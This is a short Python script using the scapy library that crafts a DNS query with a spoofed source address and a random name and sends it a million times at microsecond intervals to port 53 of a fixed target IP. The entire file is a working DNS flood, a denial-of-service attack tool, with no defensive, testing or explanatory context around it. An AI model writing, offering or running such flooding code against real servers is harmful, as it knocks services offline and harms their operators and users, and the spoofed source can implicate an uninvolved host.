from scapy.all import *
import random
import string
import sys

def flood():
    ip = IP(src='192.168.168.169', dst='12.12.1.169')
    udp = UDP(sport=5000, dport=53)
    name = ''.join(random.sample(string.digits + string.ascii_letters, 8))
    dns = DNS(id=1, qd=DNSQR(qname=name))
    pkt = ip / udp / dns
    return pkt

if __name__ == '__main__':
    send(flood(), inter=0.000001, count=1000000, iface='eth0')
    sys.exit()
